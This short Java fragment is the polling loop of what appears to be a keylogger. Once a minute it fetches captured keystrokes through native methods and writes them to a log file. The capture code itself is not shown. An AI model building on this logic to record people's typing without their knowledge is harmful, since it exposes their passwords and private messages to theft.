while(isStarted) {
    try {
        Thread.sleep(60000); // sleep for 1 minute
    } catch(InterruptedException exc) {
        exc.printStackTrace();
    }
    ArrayList<String> keyStrokeList = nativeMethods.getKeyStrokeList();
    int result = copy.copyToLogFile(keyStrokeList);
    System.out.println(result);
}